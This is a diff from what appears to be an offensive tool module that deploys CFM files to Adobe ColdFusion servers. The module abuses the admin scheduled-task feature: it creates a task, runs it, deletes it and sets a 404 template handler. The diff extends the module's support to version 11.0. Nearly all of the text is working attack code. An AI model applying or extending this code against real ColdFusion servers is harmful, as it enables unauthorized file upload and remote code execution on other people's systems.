@@ -12,7 +12,7 @@ import utility
 
 
 title = CINTERFACES.CFM
-versions = ['7.0', '8.0', '9.0', '10.0'] # needs testing for older versions
+versions = ['7.0', '8.0', '9.0', '10.0', '11.0']
 def deploy(fingerengine, fingerprint):
     """ This is currently a little messy since all major versions
     have slight differences between them.  If 6.x/7.x are significantly
@@ -26,7 +26,7 @@ def deploy(fingerengine, fingerprint):
     cfm_file = parse_war_path(cfm_path, True)
     dip = fingerengine.options.ip
 
-    if fingerprint.version in ["10.0"]:
+    if fingerprint.version in ["10.0", '11.0']:
         # we need the file to end with .log
         tmp = cfm_file.split('.')[0]
         system("cp %s %s/%s.log" % (cfm_path, state.serve_dir, tmp))
@@ -57,7 +57,7 @@ def deploy(fingerengine, fingerprint):
     utility.Msg("Cleaning up...")
     delete_task(dip, fingerprint, cfm_file)
 
-    if fingerprint.version in ["10.0"]:
+    if fingerprint.version in ["10.0", '11.0']:
         # set the template 404 handler
         set_template(dip, fingerprint, root, cfm_file)
 
@@ -83,10 +83,10 @@ def create_task(ip, fingerprint, cfm_file, root):
            }
 
     # version-specific settings
-    if fingerprint.version in ["9.0", "10.0"]:
+    if fingerprint.version in ["9.0", "10.0", '11.0']:
         data['csrftoken'] = csrf
 
-    if fingerprint.version in ["10.0"]:
+    if fingerprint.version in ["10.0", '11.0']:
         data['publish_overwrite'] = 'on'
     
     if fingerprint.version in ["7.0", "8.0"]:
@@ -116,7 +116,7 @@ def delete_task(ip, fingerprint, cfm_file):
         uri = "?action=delete&task={0}".format(cfm_file)
     elif fingerprint.version in ["9.0"]:
         uri = "?action=delete&task={0}&csrftoken={1}".format(cfm_file, csrf)
-    elif fingerprint.version in ["10.0"]:
+    elif fingerprint.version in ["10.0", '11.0']:
         uri = "?action=delete&task={0}&group=default&mode=server&csrftoken={1}"\
                                                         .format(cfm_file, csrf)
 
@@ -146,7 +146,7 @@ def run_task(ip, fingerprint, cfm_path):
         uri = "?runtask={0}&timeout=0".format(cfm_name)
     elif fingerprint.version in ["9.0"]:
         uri = "?runtask={0}&timeout=0&csrftoken={1}".format(cfm_name, csrf)
-    elif fingerprint.version in ["10.0"]:
+    elif fingerprint.version in ["10.0", '11.0']:
         uri = "?runtask={0}&group=default&mode=server&csrftoken={1}".format(cfm_name, csrf)
 
     response = utility.requests_get(url + uri, cookies=cookie)
@@ -166,7 +166,7 @@ def fetch_csrf(ip, fingerprint, url):
     Returns a tuple of (cookie, csrftoken)
     """
 
-    if fingerprint.version not in ['9.0', '10.0']:
+    if fingerprint.version not in ['9.0', '10.0', '11.0']:
         # versions <= 8.x do not use a CSRF token
         return (checkAuth(ip, fingerprint.port, title, fingerprint.version)[0], None)
 
